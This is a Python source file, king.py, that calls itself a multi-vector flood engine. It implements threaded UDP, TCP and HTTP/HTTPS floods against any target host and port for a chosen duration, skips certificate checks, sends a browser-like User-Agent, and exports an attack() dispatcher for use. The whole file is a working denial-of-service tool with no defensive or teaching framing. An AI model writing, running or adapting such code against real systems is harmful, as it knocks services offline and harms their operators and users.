#!/usr/bin/env python3
"""
king.py — multi-vector flood engine (UDP, TCP, HTTP/HTTPS).
"""

import socket
import ssl
import sys
import threading
import time

__all__ = ["attack", "start_attack", "_resolve", "VECTORS"]

VECTORS = ("udp", "tcp", "http")

def _resolve(target):
    if not isinstance(target, str) or not target.strip():
        raise ValueError(f"empty target: {target!r}")
    t = target.strip()
    if t.startswith("["):
        end = t.find("]")
        if end == -1:
            raise ValueError(f"malformed IPv6 target: {target!r}")
        inner = t[1:end]
        raise ValueError(f"IPv6 target not supported: {target!r}")
    if t.count(":") == 1:
        host, _, maybe_port = t.partition(":")
        if maybe_port.isdigit() and 0 < int(maybe_port) < 65536:
            t = host
    try:
        socket.inet_pton(socket.AF_INET, t)
        return t
    except OSError:
        pass
    return socket.gethostbyname(t)

def _validate(target, port, duration, threads):
    try:
        port = int(port)
        duration = int(duration)
        threads = int(threads)
    except (TypeError, ValueError):
        raise ValueError("port, duration, threads must be integers")
    if not (0 < port < 65536):
        raise ValueError("port out of range")
    if duration <= 0 or threads <= 0:
        raise ValueError("duration and threads must be > 0")
    ip = _resolve(target)
    return ip, port, duration, threads

# ── UDP ───────────────────────────────────────────────────────────────────

def _udp_worker(sock, ip, port, end_time, payload, stats):
    while time.time() < end_time:
        try:
            sock.sendto(payload, (ip, port))
            stats["sent"] += 1
        except OSError as e:
            stats["errors"] += 1
            stats["last_error"] = f"{type(e).__name__}: {e}"

def attack_udp(ip, port, duration, threads, payload_size=1024):
    end_time = time.time() + duration
    payload = b"\x00" * payload_size
    stats = {"sent": 0, "errors": 0, "last_error": ""}
    socks = []
    for _ in range(threads):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            socks.append(s)
        except OSError:
            break
    if not socks:
        raise RuntimeError("Socket creation failed")
    workers = []
    for s in socks:
        t = threading.Thread(target=_udp_worker, args=(s, ip, port, end_time, payload, stats), daemon=True)
        t.start()
        workers.append(t)
    for t in workers: t.join()
    for s in socks:
        try: s.close()
        except: pass
    return {"workers": len(workers), "sent": stats["sent"], "errors": stats["errors"], "last_error": stats["last_error"]}

# ── TCP ───────────────────────────────────────────────────────────────────

def _tcp_worker(ip, port, end_time, stats):
    while time.time() < end_time:
        try:
            c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            c.settimeout(2.0)
            c.connect((ip, port))
            c.send(b"\x00" * 64)
            try: c.recv(64)
            except: pass
            c.close()
            stats["sent"] += 1
        except OSError as e:
            stats["errors"] += 1
            stats["last_error"] = f"{type(e).__name__}: {e}"

def attack_tcp(ip, port, duration, threads):
    end_time = time.time() + duration
    stats = {"sent": 0, "errors": 0, "last_error": ""}
    workers = []
    for _ in range(threads):
        t = threading.Thread(target=_tcp_worker, args=(ip, port, end_time, stats), daemon=True)
        t.start()
        workers.append(t)
    for t in workers: t.join()
    return {"workers": len(workers), "sent": stats["sent"], "errors": stats["errors"], "last_error": stats["last_error"]}

# ── HTTP / HTTPS ──────────────────────────────────────────────────────────

def _http_worker(ip, port, end_time, req, stats, use_ssl, host_header):
    ctx = None
    if use_ssl:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

    while time.time() < end_time:
        try:
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw_sock.settimeout(3.0)
            raw_sock.connect((ip, port))
            
            if use_ssl:
                sock = ctx.wrap_socket(raw_sock, server_hostname=host_header)
            else:
                sock = raw_sock

            sock.send(req)
            try: sock.recv(1024)
            except: pass
            sock.close()
            stats["sent"] += 1
        except OSError as e:
            stats["errors"] += 1
            stats["last_error"] = f"{type(e).__name__}: {e}"

def attack_http(ip, port, duration, threads, path="/", custom_host=None):
    end_time = time.time() + duration
    host_header = custom_host if custom_host else ip
    
    req = (f"GET {path} HTTP/1.1\r\n"
           f"Host: {host_header}\r\n"
           f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
           f"Accept: */*\r\n"
           f"Connection: keep-alive\r\n\r\n").encode()
    
    stats = {"sent": 0, "errors": 0, "last_error": ""}
    use_ssl = (port == 443)
    
    workers = []
    for _ in range(threads):
        t = threading.Thread(target=_http_worker, args=(ip, port, end_time, req, stats, use_ssl, host_header), daemon=True)
        t.start()
        workers.append(t)
    for t in workers: t.join()
    
    return {"workers": len(workers), "sent": stats["sent"], "errors": stats["errors"], "last_error": stats["last_error"]}

# ── Dispatcher ────────────────────────────────────────────────────────────

def attack(target, port, duration, threads=100, payload_size=1024, vector="udp", custom_host=None):
    vector = (vector or "udp").lower()
    if vector not in VECTORS:
        raise ValueError(f"unknown vector {vector!r}")
    ip, port, duration, threads = _validate(target, port, duration, threads)

    if vector == "udp":
        return attack_udp(ip, port, duration, threads, payload_size)
    if vector == "tcp":
        return attack_tcp(ip, port, duration, threads)
    return attack_http(ip, port, duration, threads, custom_host=custom_host)
